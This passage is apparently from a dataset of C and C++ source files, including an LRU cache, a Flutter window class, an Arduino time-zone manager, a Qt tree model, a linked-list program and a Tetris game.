VVRR */\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\n# if (__WATCOMC__ % 10) > 0\n#  define COMPILER_VERSION_PATCH DEC(__WATCOMC__ % 10)\n# endif\n\n#elif defined(__WATCOMC__)\n# define COMPILER_ID \"OpenWatcom\"\n   /* __WATCOMC__ =",
    "#include <iostream>\n#include <unordered_map>\n#include <list>\n#include <mutex>\n#include <memory>\n\ntemplate<typename KeyType, typename ValueType>\nclass LRUCache {\npublic:\n    // Constructor to init the cache w/ a given capacity\n    explicit LRUCache(size_t size) : capacity(size) {}\n\n    // Function to retrieve a value from the cache\n    ValueType get(const KeyType& key) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock for thread safety\n        auto it = cache_map.find(key);  // Attempt to find the key in the hash map\n        if (it == cache_map.end()) {\n            throw std::range_error(\"Key not found\");  // Key not found, throw exception\n        }\n        \n        usage_list.splice(usage_list.begin(), usage_list, it->second); // Moves accessed node\n        return it->second->second;  // Return the value associated with the key\n    }\n\n    // Function to insert or update a value in the cache\n    void put(const KeyType& key, const ValueType& value) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock for thread safety\n        auto it = cache_map.find(key);  // Check if key already exists in the cache\n        if (it != cache_map.end()) {\n            // If key exists -> MRU\n            usage_list.splice(usage_list.begin(), usage_list, it->second);\n            it->second->second = value;  // Update the value\n            return;\n        }\n\n        // If cache full, evict the LRU item\n        if (usage_list.size() == capacity) {\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove from map\n            usage_list.pop_back();  // Remove from list\n        }\n\n        // Inserts the new key-value pair at the front of the list\n        usage_list.emplace_front(key, value);\n        cache_map[key] = usage_list.begin();  // Update map to point to the new element in the list\n    }\n\n    // Function to remove an object from the cache if it exists\n    void erase(const KeyType& key) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock to ensure thread safety\n        auto it = cache_map.find(key);  // Find the key in the map\n        if (it != cache_map.end()) {\n            usage_list.erase(it->second);  // Remove from list\n            cache_map.erase(it);  // Remove from map\n        }\n    }\n\n    // Function to dynamically adjust the cache's capacity\n    void resize(size_t new_capacity) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock to ensure thread safety\n        while (usage_list.size() > new_capacity) {  // If current size is larger than new capacity, reduce size\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove least recently used items\n            usage_list.pop_back();\n        }\n        capacity = new_capacity;  // Set the new capacity\n    }\n\nprivate:\n    size_t capacity;  // Maximum number of elements in the cache\n    // List to track the least recent to most recently used objects\n    std::list<std::pair<KeyType, ValueType>> usage_list;  \n    // Map to quickly lookup elements in the list\n    std::unordered_map<KeyType, typename std::list<std::pair<KeyType, ValueType>>::iterator> cache_map;\n    std::mutex cache_mutex;  // Mutex to make class thread-safe\n};\n\nint main() {\n    LRUCache<int, std::string> cache(2);  // Create a cache for up to 2 items\n    cache.put(1, \"data1\");  // Insert item with key 1\n    cache.put(2, \"data2\");  // Insert item with key 2\n    try {\n        std::cout << \"1 -> \" << cache.get(1) << std::endl;  // Access item with key 1\n    } catch (const std::exception& e) {\n        std::cout << e.what() << std::endl;\n    }\n    cache.put(3, \"data3\");  // Insert item with key 3, causing key 2 to be evicted\n    try {\n        std::cout << \"2 -> \" << cache.get(2) << std::endl;  // Attempt to access item with key 2\n    } catch (const std::exception& e) {\n        std::cout << \"2 -> \" << e.what() << std::endl;  // Should print \"Key not found\"\n    }\n    return 0;\n}\n\n",
    "#include <bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main() {\r\n    cin.tie(0); ios_base::sync_with_stdio(0);\r\n\r\n    int q; cin >> q;\r\n\r\n    set<int> st;\r\n    for (int i = 0; i < q; i++) {\r\n        string S; cin >> S;\r\n        if (S == \"add\") {\r\n            int x; cin >> x;\r\n            st.insert(x);\r\n        }\r\n        else if (S == \"remove\") {\r\n            int x; cin >> x;\r\n            st.erase(x);\r\n        }\r\n        else if (S == \"find\") {\r\n            int x; cin >> x;\r\n            cout << (st.find(x) != st.end() ? \"true\\n\" : \"false\\n\");\r\n        }\r\n        else if (S == \"lower_bound\") {\r\n            int x; cin >> x;\r\n            auto it = st.lower_bound(x);\r\n\r\n            if (it != st.end()) {\r\n                cout << *it << '\\n';\r\n            }\r\n            else {\r\n                cout << \"None\\n\";\r\n            }\r\n        }\r\n        else if (S == \"upper_bound\") {\r\n            int x; cin >> x;\r\n            auto it = st.upper_bound(x);\r\n\r\n            if (it != st.end()) {\r\n                cout << *it << '\\n';\r\n            }\r\n            else {\r\n                cout << \"None\\n\";\r\n            }\r\n        }\r\n        else if (S == \"largest\") {\r\n            if (st.empty()) {\r\n                cout << \"None\\n\";\r\n            }\r\n            else {\r\n                cout << *st.rbegin() << '\\n';\r\n            }\r\n        }\r\n        else {\r\n            if (st.empty()) {\r\n                cout << \"None\\n\";\r\n            }\r\n            else {\r\n                cout << *st.begin() << '\\n';\r\n            }\r\n        }\r\n    }\r\n}",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <Arduino.h>\n#include <WiFi.h>\n#include <HTTPClient.h>\n\n#include \"TimeZoneManager.h\"\n\nPreferences preferences;\n\nvoid TimeZoneManager::set_logger(logger_cb_t logger) {\n  _logger = logger;\n}\n\n\nvoid TimeZoneManager::begin(ClockManager *clock) {\n  _preferences.begin(\"time\", false);\n  String tz = _preferences.getString(\"tz\", \"\");\n  _preferences.end();\n\n  if (tz != \"\") {\n    setenv(\"TZ\", tz.c_str(), 1);\n    tzset();\n    (*_logger)(\"Loaded TZ = %s\", tz.c_str());\n  } else {\n    if (WiFi.status() == WL_CONNECTED) {\n      set_from_api();\n    }\n  }\n\n  struct tm timeinfo;\n  getLocalTime(&timeinfo);\n  clock->set_displayed_time(timeinfo.tm_hour, timeinfo.tm_min);\n}\n\nvoid TimeZoneManager::set(String tz) {\n  const char* posix = convert_name(tz.c_str());\n  setenv(\"TZ\", posix, 1);\n  tzset();\n\n  _preferences.begin(\"time\", false);\n  _preferences.putString(\"tz\", String(posix));\n  _preferences.end();\n\n  (*_logger)(\"Set time zone to %s\", tz);\n  (*_logger)(\"TZ = %s\", posix);\n}\n\nvoid TimeZoneManager::set_from_api() {\n  #if ENABLE_WIFI == 1\n  WiFiClient client;\n  HTTPClient http;\n\n  (*_logger)(\"Requesting time zone from ip-api.com\");\n\n  http.begin(client, \"http://ip-api.com/line/?fields=256\");\n  int httpResponseCode = http.GET();\n\n  String payload = \"\";\n  if (httpResponseCode > 0) {\n    payload = http.getString();\n    payload.trim();\n    set(payload);\n  } else {\n    (*_logger)(\"Error code: %s\", httpResponseCode);\n  }\n  http.end();\n  #endif\n}\n\nconst char* TimeZoneManager::convert_name(const char* tzdata) {\n  int offset = 0;\n  const char* current = TIME_ZONE_NAMES;\n  while (strlen(current) > 0) {\n    if (strcmp(tzdata, current) == 0) {\n      const char* posix = TIME_ZONE_STRINGS;\n      while (offset > 0 || strcmp(posix, \"~\") == 0) {\n        posix = posix + strlen(posix) + 1;\n        offset--;\n      }\n      return posix;\n    }\n\n    current = current + strlen(current) + 1;\n    offset++;\n  }\n\n  return \"UTC0\";\n}",
    "/**     @file ModelPartList.h\n  *\n  *     EEEE2076 - Software Engineering & VR Project\n  *\n  *     Template for model part list that will be used to create the trewview.\n  *\n  *     P Evans 2022\n  */\n\n#include \"ModelPartList.h\"\n#include \"ModelPart.h\"\n\nModelPartList::ModelPartList( const QString& data, QObject* parent ) : QAbstractItemModel(parent) {\n    /* Have option to specify number of visible properties for each item in tree - the root item\n     * acts as the column headers\n     */\n    rootItem = new ModelPart( { tr(\"Part\"), tr(\"Visible?\") } );\n}\n\n\n\nModelPartList::~ModelPartList() {\n    delete rootItem;\n}\n\n\nint ModelPartList::columnCount( const QModelIndex& parent ) const {\n    Q_UNUSED(parent);\n\n    return rootItem->columnCount();\n}\n\n\nQVariant ModelPartList::data( const QModelIndex& index, int role ) const {\n    /* If the item index isnt valid, return a new, empty QVariant (QVariant is generic datatype\n     * that could be any valid QT class) */\n    if( !index.isValid() )\n        return QVariant();\n\n    /* Role represents what this data will be used for, we only need deal with the case\n     * when QT is asking for data to create and display the treeview. Return a new,\n     * empty QVariant if any other request comes through. */\n    if (role != Qt::DisplayRole)\n        return QVariant();\n\n    /* Get a a pointer to the item referred to by the QModelIndex */\n    ModelPart* item = static_cast<ModelPart*>( index.internalPointer() );\n\n    /* Each item in the tree has a number of columns (\"Part\" and \"Visible\" in this \n     * initial example) return the column requested by the QModelIndex */\n    return item->data( index.column() );\n}\n\n\nQt::ItemFlags ModelPartList::flags( const QModelIndex& index ) const {\n    if( !index.isValid() )\n        return Qt::NoItemFlags;\n\n    return QAbstractItemModel::flags( index );\n}\n\n\nQVariant ModelPartList::headerData( int section, Qt::Orientation orientation, int role ) const {\n    if( orientation == Qt::Horizontal && role == Qt::DisplayRole )\n        return rootItem->data( section );\n\n    return QVariant();\n}\n\n\nQModelIndex ModelPartList::index(int row, int column, const QModelIndex& parent) const {\n    ModelPart* parentItem;\n    \n    if( !parent.isValid() || !hasIndex(row, column, parent) )\n        parentItem = rootItem;              // default to selecting root \n    else\n        parentItem = static_cast<ModelPart*>(parent.internalPointer());\n\n    ModelPart* childItem = parentItem->child(row);\n    if( childItem )\n        return createIndex(row, column, childItem);\n    \n    \n    return QModelIndex();\n}\n\n\nQModelIndex ModelPartList::parent( const QModelIndex& index ) const {\n    if (!index.isValid())\n        return QModelIndex();\n\n    ModelPart* childItem = static_cast<ModelPart*>(index.internalPointer());\n    ModelPart* parentItem = childItem->parentItem();\n\n    if( parentItem == rootItem )\n        return QModelIndex();\n\n    return createIndex( parentItem->row(), 0, parentItem );\n}\n\n\nint ModelPartList::rowCount( const QModelIndex& parent ) const {\n    ModelPart* parentItem;\n    if( parent.column() > 0 )\n        return 0;\n\n    if( !parent.isValid() )\n        parentItem = rootItem;\n    else\n        parentItem = static_cast<ModelPart*>(parent.internalPointer());\n\n    return parentItem->childCount();\n}\n\n\nModelPart* ModelPartList::getRootItem() {\n    return rootItem; \n}\n\n\n\nQModelIndex ModelPartList::appendChild(QModelIndex& parent, const QList<QVariant>& data) {      \n    ModelPart* parentPart;\n\n    if (parent.isValid())\n        parentPart = static_cast<ModelPart*>(parent.internalPointer());\n    else {\n        parentPart = rootItem;\n        parent = createIndex(0, 0, rootItem );\n    }\n\n    beginInsertRows( parent, rowCount(parent), rowCount(parent) ); \n\n    ModelPart* childPart = new ModelPart( data, parentPart );\n\n    parentPart->appendChild(childPart);\n\n    QModelIndex child = createIndex(0, 0, childPart);\n\n    endInsertRows();\n\n    emit layoutChanged();\n\n    return child;\n}\n\n",
    "#ifndef _MAIN\r\n#define _MAIN\r\n\r\n#include <iostream>\r\n#include \"biblioteca/funciones/strings.hpp\"\r\n#include \"biblioteca/funciones/tokens.hpp\"\r\n#include \"biblioteca/funciones/files.hpp\"\r\n#include \"biblioteca/tads/parte2/Array.hpp\"\r\n#include \"biblioteca/tads/parte2/Map.hpp\"\r\n#include \"biblioteca/tads/parte2/List.hpp\"\r\n#include \"biblioteca/tads/parte2/Stack.hpp\"\r\n#include \"biblioteca/tads/parte2/Queue.hpp\"\r\n#include \"biblioteca/tads/parte1/Coll.hpp\"\r\n#include \"biblioteca/tads/parte1/MultidimColl.hpp\"\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n   /*\r\n      cout<< length(\"Pirulito\")<<endl;\r\n      tutorial  1+i\r\n      cout<< charCount(\"Apap.ku 6apa\", 'x');\r\n\r\n      string s=\"patata en casa en arg\";\r\n\r\n      cout<< substring(s,2,length(s))<<endl;\r\n      //cout<< substring(s,5)<<endl;\r\n\r\n      int p = indexOf(s,'c');\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,'a',5);\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"en\");\r\n      cout << p << endl;\r\n\r\n      int p = indexOf(s,\"ta\",3);\r\n      cout << p << endl;\r\n\r\n      int p = lastIndexOf(s,'e');\r\n      cout << p << endl;\r\n\r\n      char palabrita='D';\r\n        int valor= charToInt(palabrita);\r\n        cout << valor << endl;\r\n\r\n      int numerito=65;\r\n      char letrita= intToChar(numerito);\r\n      cout << letrita << endl;\r\n\r\n      int numerote=4587412;\r\n      int posicion=0;\r\n      int digito= getDigit(numerote,posicion);\r\n      cout<< digito<<endl;\r\n\r\n      int digitocontador= digitCount(numerote);\r\n      cout<< digitocontador<<endl;\r\n\r\n      int numero=123;\r\n      string resultado = intToString(numero);\r\n      cout<<resultado<<endl;\r\n\r\n      int b=16;\r\n      string cadenaStringtoInt =\"12AB\"; //Ingresar binarios decimal o hexa\r\n      int iStringtoint= stringToInt(cadenaStringtoInt,b);\r\n      cout<<iStringtoint<<endl;\r\n\r\n      string ssobrecar=\"12323\";\r\n      int istringtoubtsobre= stringToInt(ssobrecar);\r\n      cout<<istringtoubtsobre<<endl;\r\n\r\n      char cchartistring = ' ';\r\n      string sChartostring = charToString(cchartistring);\r\n      cout << sChartostring << endl; // muestra: A\r\n      cout << length(sChartostring) << endl; // muestra: 1\r\n        return 0;\r\n\r\n      string sStringtochar = \" \";\r\n      char cstringtochar = stringToChar(sStringtochar);\r\n      cout << cstringtochar << endl; // muestra: A\r\n      cout << (int)cstringtochar << endl; // muestra: 65\r\n\r\n      string s = \"10\";\r\n      int i = stringToInt(s,10);\r\n      cout << i << endl;\r\n      int i = stringToInt(s);\r\n      cout << i << endl;\r\n\r\n      string s = stringToString(\"Hola\");\r\n      cout << s << endl;\r\n\r\n      double d = 123.4;\r\n      string s = doubleToString(d);\r\n      cout << s << endl;\r\n\r\n      string s = \"123.4\";\r\n      double d = stringToDouble(s);\r\n      cout << d << endl;\r\n\r\n      string s = \"\";\r\n      cout << isEmpty(s) << endl;\r\n\r\n      string s1 = \"cursoDeAlgoritmos\";\r\n      string s2 = \"c\";\r\n      if( startsWith(s1,s2) )\r\n      {\r\n         cout << s2 << \" es prefijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es prefijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s1 = \"curso de patatas\";\r\n      string s2 = \"patatas\";\r\n      if( endsWith(s1,s2) )\r\n      {\r\n      cout << s2 << \" es sufijo de: \" << s1 << endl;\r\n      }\r\n      else {\r\n         cout<<s2<<\" no es sufijo \"<<s1<<endl;\r\n      }\r\n\r\n      string s = \"abcd\";\r\n      char c = 'a';\r\n      if( contains(s,c) )\r\n      {\r\n         cout << s << \" contiene a: \" << c << endl;\r\n      }\r\n      else\r\n      {\r\n         cout << s << \" NO contiene a: \" << c << endl;\r\n      }\r\n\r\n      string s = \"Esto es una prueba\";\r\n      string r = replace(s,'e','X');\r\n      cout << r << endl;\r\n\r\n      string s = \"Esto es una prueba\";\r\n      int pos = 4;\r\n      char c = 'X';\r\n      string r = insertAt(s,pos,c);\r\n      cout << r << endl;\r\n\r\n      int n = 5;\r\n      string r = spaces(n);\r\n      // muestra: [ ] (cinco espacios)\r\n      cout << \"[\" << r << \"]\" << endl;\r\n\r\n   char c = '3';\r\n   if( isDigit(c) )\r\n   {\r\n   cout << c << \" es digito\" << endl;\r\n   }\r\n   else\r\n   {\r\n   cout << c << \" NO es digito\" << endl;\r\n   }\r\n\r\n   char c = 'X';\r\n   if( isLetter(c) )\r\n   {\r\n   cout << c << \" es letra\" << endl; // SALIDA\r\n   }\r\n   else\r\n   {\r\n      cout << c << \" NO es letra\" << endl;\r\n   }\r\n  }\r\n\r\n   string s1 = \"Pablo\";\r\n   string s2 = \"Queso\";\r\n   if( cmpString(s1,s2)<0 )\r\n   {\r\n   cout << s1 << \" es menor que: \" << s2 << endl;\r\n   }\r\n   else if(cmpString(s1,s2)>0){\r\n   cout << s1 << \" es mayor que: \" << s2 << endl;\r\n   }\r\n   else{\r\n   cout << s1 << \" es igual que: \" << s2 << endl;\r\n   }\r\n\r\n   double x = 25.7;\r\n   double y = 36.9;\r\n   if( cmpDouble(x,y)<0 )\r\n   {\r\n   cout << x << \" es menor que: \" << y << endl;\r\n   }\r\n   else if(cmpDouble(x,y)>0){\r\n      cout << x << \" es mayor que: \" << y << endl;\r\n      }\r\n   else{\r\n      cout << x << \" es igual que: \" << y << endl;\r\n     }\r\n\r\n   char c = 'n';\r\n   char r = toUpperCase(c);\r\n   cout << r << endl;\r\n   }\r\n\r\n   char c = 'n';\r\n   char r = toLowerCase(c);\r\n   cout << r << endl;\r\n\r\n   string s = \"",
    "#include <iostream>\nusing namespace std;\nstruct node\n{\n\tint data;\n\tnode* next;\n};\n\nnode* head = NULL;\nnode* current = NULL;\nnode* tail = NULL;\n\nvoid insert(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\ttail->next = current;\n\t\ttail = tail->next;\n\t}\n}\nvoid AddToHead(int newdata)\n{\n\tcurrent = new node;\n\tcurrent->data = newdata;\n\tcurrent->next = NULL;\n\tif (head == NULL)\n\t{\n\t\thead = current;\n\t\ttail = current;\n\t}\n\telse\n\t{\n\t\tcurrent->next = head;\n\t\thead = current;\n\t}\n}\nvoid deleteNode(int Deldata) {\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tif (current->data == Deldata)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t}\n\t\telse\n\t\t{\n\t\t\twhile (current != NULL)\n\t\t\t{\n\t\t\t\tif ((current->next)->data == Deldata)\n\t\t\t\t{\n\t\t\t\t\t(current->next) = (current->next)->next;\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\telse { current = current->next; }\n\t\t\t}\n\t\t}\n\t}\n\telse { cout << \"No Data Found\" << endl; }\n}\nvoid destoryList()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\thead = head->next;\n\t\t\tdelete current;\n\t\t\tcurrent = head;\n\t\t}\n\t\thead = NULL;\n\t\ttail = NULL;\n\t\tcout << \"The list is Destroyed Successfully\" << endl;\n\t}\n\telse\n\t{ cout << \"There is no list to be destroyed\" << endl; }\n}\nvoid display()\n{\n\tif (head != NULL)\n\t{\n\t\tcurrent = head;\n\t\tcout << \"Data:\" << endl;\n\t\twhile (current != NULL)\n\t\t{\n\t\t\tcout << current->data << endl;\n\t\t\tcurrent = current->next;\n\t\t}\n\t}\n\telse\n\t{ cout << \"No Data Found\" << endl; }\n}\n\nvoid app() {\n\t/*\n\t\top -> operation\n\t\tath -> add to head\n\t\tdn -> deleted node\n\t\tc -> confirm\n\t\tao -> another operation\n\t\ts -> starter app\n\t*/\n\tint op, ath, dn, c, ao, s;\n\n\tcout << \"--- Welcome to linked list implementation---\\n\";\n\tdo {\n\t\tcout << \"Choise what do you want\\n\";\n\t\tcout << \"Add to head -> (1)\\n\";\n\t\tcout << \"Delete node -> (2)\\n\";\n\t\tcout << \"Display -> (3)\\n\";\n\t\tcout << \"Destory list -> (4)\\n\";\n\t\tcout << \"Exit -> (5)\\n\";\n\t\tcin >> op;\n\t\tif (op == 1) {\n\t\t\tcout << \"Enter value do you want to add to head\\n\";\n\t\t\tcin >> ath;\n\t\t\tAddToHead(ath);\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 2) {\n\t\t\tdisplay();\n\t\t\tcout << \"Choise the node \\n\";\n\t\t\tcin >> dn;\n\t\t\tcout << \"Are you sure to delete this node\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdeleteNode(dn);\n\t\t\t\tcout << \"\\nCheck data of list after deleting node : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Delete is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 3) {\n\t\t\tcout << \"\\nThe Nodes of the Linked List are: \\n\";\n\t\t\tdisplay();\n\t\t}\n\t\telse if (op == 4) {\n\t\t\tdisplay();\n\t\t\tcout << \"\\nIF Destroyed the whole list\\n \\t The result will be: \\n\";\n\t\t\tcout << \"Are you sure to destroy the whole list\\n\";\n\t\t\tcout << \"To Confirm Enter -> (1)\\n\";\n\t\t\tcout << \"To Cancel Enter -> any key\\n\";\n\t\t\tcin >> c;\n\t\t\tif (c == 1)\n\t\t\t{\n\t\t\t\tdestoryList();\n\t\t\t\tcout << \"\\nCheck data of list after destroying : \\n \";\n\t\t\t\tdisplay();\n\t\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tcout << \"Destroy is canceled\\n\";\n\t\t\t}\n\t\t}\n\t\telse if (op == 5)\n\t\t{\n\t\t\treturn;\n\t\t}\n\t\telse { cout << \"Error in entry\\n\"; }\n\n\t\tcout << \"\\n\";\n\n\t\tcout << \"Do you want another opration\\n\";\n\t\tcout << \"Yes -> 1 \\n\";\n\t\tcout << \"NO -> any key \\n\";\n\t\tcin >> ao;\n\n\t} while (ao == 1);\n}\nint main()\n{\n\tapp();\n\treturn 0;\n}",
    "#include \"Tetris.h\"\n#include <time.h>\n#include <stdlib.h>\n#include <conio.h> //\u63a7\u5236\u53f0\u7684io\u8f93\u5165\u8f93\u51fa,\u952e\u76d8\n#include <iostream>\n#include <fstream>\n#include \"Block.h\"\n#include <mmsystem.h>\n#pragma comment(lib,\"winmm.lib\")\n\n#define MAX_LEVEL 5\n#define RECORDER_FILE \"recorder.txt\"\n\n//const int SPEED_NORMAL = 500; //ms\nconst int SPEED_NORMAL[MAX_LEVEL] = { 500,400,300,200,100 };\nconst int SPEED_QUICK = 50;\n\nTetris::Tetris(int rows, int cols, int left, int top, int blockSize)\n{\n\tthis->rows = rows;\n\tthis->cols = cols;\n\tthis->leftMargin = left;\n\tthis->topMargin = top;\n\tthis->blockSize = blockSize;\n\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tvector<int> mapRow;\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tmapRow.push_back(0);\n\t\t}\n\t\tmap.push_back(mapRow);\n\t}\n}\n\nvoid Tetris::init()\n{\n\tmciSendString(\"play res/bg.mp3 repeat\", 0, 0, 0);\n\t\n\tdelay = SPEED_NORMAL[0];\n\n\t//\u914d\u7f6e\u968f\u673a\u79cd\u5b50\n\tsrand(time(NULL));\n\n\t//\u521b\u5efa\u6e38\u620f\u7a97\u53e3\n\tinitgraph(938, 896);\n\n\t//\u52a0\u8f7d\u80cc\u666f\u56fe\u7247\n\tloadimage(&imgBg, \"res/bg2.png\");\n\n\tloadimage(&imgWin, \"res/win.png\");\n\tloadimage(&imgOver, \"res/over.png\");\n\n\t//\u521d\u59cb\u5316\u6e38\u620f\u533a\u4e2d\u7684\u6570\u636e\n\tchar data[20][10];\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tmap[i][j] = 0;\n\t\t}\n\t}\n\n\tscore = 0;\n\tlineCount = 0;\n\tlevel = 1;\n\n\t//\u521d\u59cb\u5316\u6700\u9ad8\u5206\n\tifstream file(RECORDER_FILE);\n\tif (!file.is_open())\n\t{\n\t\tcout << RECORDER_FILE << \"\u6253\u5f00\u5931\u8d25\" << endl;\n\t\thighestScore = 0;\n\t}\n\telse\n\t{\n\t\tfile >> highestScore;\n\t}\n\tfile.close(); //\u5173\u95ed\u6587\u4ef6\n\n\tgameOver = false;\n}\n\nvoid Tetris::play()\n{\n\tinit();\n\n\tnextBlock = new Block;\n\tcurBlock = nextBlock;\n\tnextBlock = new Block;\n\n\tint timer = 0;\n\twhile (1)\n\t{\n\t\t//\u63a5\u53d7\u7528\u6237\u7684\u8f93\u5165\n\t\tkeyEvent();\n\t\ttimer += getDelay();\n\t\tif (timer > delay)\n\t\t{\n\t\t\ttimer = 0;\n\t\t\tdrop();\n\t\t\t//\u6e32\u67d3\u6e38\u620f\u753b\u9762\n\t\t\tupdate = true;\n\t\t}\n\n\t\tif (update)\n\t\t{\n\t\t\tupdate = false;\n\t\t\t//\u66f4\u65b0\u6e38\u620f\u7684\u753b\u9762\n\t\t\tupdateWindow();\n\t\t\t\n\t\t\t//\u66f4\u6539\u6e38\u620f\u6570\u636e\n\t\t\tclearLine();\n\t\t}\n\n\t\tif (gameOver)\n\t\t{\n\t\t\t//\u4fdd\u5b58\u5206\u6570\n\t\t\tsaveScore();\n\t\t\t//\u66f4\u65b0\u6e38\u620f\u7ed3\u675f\u754c\u9762\n\t\t\tdisplayOver();\n\n\t\t\tsystem(\"pause\");\n\t\t\tinit(); //\u91cd\u65b0\u5f00\u5c40\n\t\t}\n\t}\n}\n\nvoid Tetris::keyEvent()\n{\n\tunsigned char ch; //\u6709\u7b26\u53f7\u8303\u56f4\uff1a-128,127\n\tbool rotateFlag = false;\n\tint dx = 0;\n\tif (_kbhit()) //\u6309\u952e\u8f93\u5165\n\t{\n\t\tch = _getch();\n\n\t\t//\u5982\u679c\u6309\u4e0b\u65b9\u5411\u952e\uff0c\u4f1a\u81ea\u52a8\u8fd4\u56de\u4e24\u4e2a\u5b57\u7b26\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u4e0a\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 72\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u4e0b\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 80\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u5de6\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 75\n\t\t//\u5982\u679c\u6309\u4e0b\u5411\u53f3\u952e\uff0c\u4f1a\u5148\u540e\u8fd4\u56de\uff1a224 77\n\t\tif (ch == 224)\n\t\t{\n\t\t\tch = _getch();\n\t\t\tswitch (ch)\n\t\t\t{\n\t\t\tcase 72:\n\t\t\t\trotateFlag = true;\n\t\t\t\tbreak;\n\t\t\tcase 80:\n\t\t\t\tdelay = SPEED_QUICK;\n\t\t\t\tbreak;\n\t\t\tcase 75:\n\t\t\t\tdx = -1;\n\t\t\t\tbreak;\n\t\t\tcase 77:\n\t\t\t\tdx = 1;\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t}\n\n\tif (rotateFlag)\n\t{\n\t\trotate();\n\t\tupdate = true;\n\t}\n\n\tif (dx != 0)\n\t{\n\t\tmoveLeftRight(dx);\n\t\tupdate = true;\n\t}\n}\n\nvoid Tetris::updateWindow()\n{\n\tIMAGE** imgs = Block::getImages();\n\tBeginBatchDraw(); //\u9632\u6b62\u95ea\u70c1\n\n\tputimage(0, 0, &imgBg);  //\u7ed8\u5236\u80cc\u666f\u56fe\u7247\n\n\tfor (int i = 0;i < rows;i++)\n\t{\n\t\tfor (int j = 0;j < cols;j++)\n\t\t{\n\t\t\tif (map[i][j] == 0)\n\t\t\t\tcontinue;\n\t\t\tint x = j * blockSize + leftMargin;\n\t\t\tint y = i * blockSize + topMargin;\n\t\t\tputimage(x, y, imgs[map[i][j] - 1]);\n\t\t}\n\t}\n\n\tcurBlock->draw(leftMargin, topMargin);\n\tnextBlock->draw(689, 150);\n\n\tdrawScore();  //\u7ed8\u5236\u5206\u6570\n\n\tEndBatchDraw();\n}\n\n//\u7b2c\u4e00\u6b21\u8c03\u7528\uff0c\u8fd4\u56de0\n//\u8fd4\u56de\u8ddd\u79bb\u4e0a\u4e00\u6b21\u8c03\u7528\u95f4\u9694\nint Tetris::getDelay()\n{\n\tstatic unsigned long long lastTime = 0;\n\tunsigned long long currentTime = 